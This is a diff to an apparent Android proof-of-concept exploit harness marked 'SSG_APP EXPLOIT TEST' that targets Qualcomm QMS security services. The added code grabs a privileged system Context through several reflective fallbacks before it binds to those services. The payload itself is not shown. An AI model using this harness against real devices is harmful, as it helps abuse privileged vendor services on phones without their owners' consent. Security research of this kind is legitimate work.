@@ -1,14 +1,12 @@
 package com.poc;
 
 import android.app.ActivityThread;
+import android.app.AppGlobals;
+import android.app.ContextImpl;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
-import android.os.Build;
-import android.os.Bundle;
-import android.os.Environment;
-import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.Parcel;
@@ -16,7 +14,7 @@ import android.os.ParcelFileDescriptor;
 import android.os.RemoteException;
 import android.os.ServiceManager;
 import android.provider.Settings;
-import android.text.TextUtils;
+import android.util.Log;
 
 import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
 import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
@@ -32,9 +30,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Date;
-import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
@@ -88,18 +84,18 @@ public class Main {
 
     public static void main(String[] args) {
         try {
-            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
-            Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
-            systemMain.setAccessible(true);
-            Object activityThread = systemMain.invoke(null);
-            Method getSystemContext = activityThreadClass.getDeclaredMethod("getSystemContext");
-            getSystemContext.setAccessible(true);
-            sContext = (Context) getSystemContext.invoke(activityThread);
-            appendLog("[*] Context obtained: " + sContext);
+            Looper.prepareMainLooper();
         } catch (Exception e) {
-            appendLog("[!] Failed to get Context: " + e.getMessage());
+            appendLog("[!] Looper prep: " + e.getMessage());
+        }
+
+        sContext = getContext();
+        if (sContext == null) {
+            appendLog("[!] Failed to obtain Context, exiting.");
+            saveLog();
             System.exit(1);
         }
+        appendLog("[*] Context obtained: " + sContext.getClass().getName());
 
         appendLog("========================================");
         appendLog("========== SSG_APP EXPLOIT TEST ==========");
@@ -108,7 +104,7 @@ public class Main {
         bindServices();
 
         try {
-            if (!latch.await(10, TimeUnit.SECONDS)) {
+            if (!latch.await(15, TimeUnit.SECONDS)) {
                 appendLog("[!] Bind timeout");
             }
         } catch (InterruptedException e) {
@@ -144,6 +140,79 @@ public class Main {
         appendLog("========================================");
         saveLog();
         System.exit(0);
+    }
+
+    private static Context getContext() {
+        Context ctx = null;
+        try {
+            ActivityThread at = ActivityThread.currentActivityThread();
+            if (at != null) {
+                Method getSystemContext = ActivityThread.class.getDeclaredMethod("getSystemContext");
+                getSystemContext.setAccessible(true);
+                ctx = (Context) getSystemContext.invoke(at);
+                appendLog("[CTX] Got via currentActivityThread.getSystemContext()");
+                return ctx;
+            }
+        } catch (Exception e) {
+            appendLog("[CTX] currentActivityThread failed: " + e.getMessage());
+        }
+
+        try {
+            ctx = AppGlobals.getInitialApplication();
+            if (ctx != null) {
+                appendLog("[CTX] Got via AppGlobals.getInitialApplication()");
+                return ctx;
+            }
+        } catch (Exception e) {
+            appendLog("[CTX] AppGlobals failed: " + e.getMessage());
+        }
+
+        try {
+            Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
+            Method systemMain = activityThreadClass.getDeclaredMethod("systemMain");
+            systemMain.setAccessible(true);
+            Object at = systemMain.invoke(null);
+            Method getSystemContext = activityThreadClass.getDeclaredMethod("getSystemContext");
+            getSystemContext.setAccessible(true);
+            ctx = (Context) getSystemContext.invoke(at);
+            appendLog("[CTX] Got via systemMain()");
+            return ctx;
+        } catch (Exception e) {
+            appendLog("[CTX] systemMain failed: " + e.getMessage());
+        }
+
+        try {
+            Class<?> contextImplClass = Class.forName("android.app.ContextImpl");
+            Method createSystemContext = contextImplClass.getDeclaredMethod("createSystemContext", ActivityThread.class);
+            createSystemContext.setAccessible(true);
+            ActivityThread at = ActivityThread.currentActivityThread();
+            if (at == null) {
+                Class<?> atClass = Class.forName("android.app.ActivityThread");
+                Method systemMain = atClass.getDeclaredMethod("systemMain");
+                systemMain.setAccessible(true);
+                at = (ActivityThread) systemMain.invoke(null);
+            }
+            ctx = (Context) createSystemContext.invoke(null, at);
+            appendLog("[CTX] Got via ContextImpl.createSystemContext()");
+            return ctx;
+        } catch (Exception e) {
+            appendLog("[CTX] ContextImpl.createSystemContext failed: " + e.getMessage());
+        }
+
+        try {
+            Class<?> contextImplClass = Class.forName("android.app.ContextImpl");
+            Field defaultContextField = contextImplClass.getDeclaredField("sSystemContext");
+            defaultContextField.setAccessible(true);
+            ctx = (Context) defaultContextField.get(null);
+            if (ctx != null) {
+                appendLog("[CTX] Got via ContextImpl.sSystemContext");
+                return ctx;
+            }
+        } catch (Exception e) {
+            appendLog("[CTX] sSystemContext failed: " + e.getMessage());
+        }
+
+        return null;
     }
 
     private static void bindServices() {
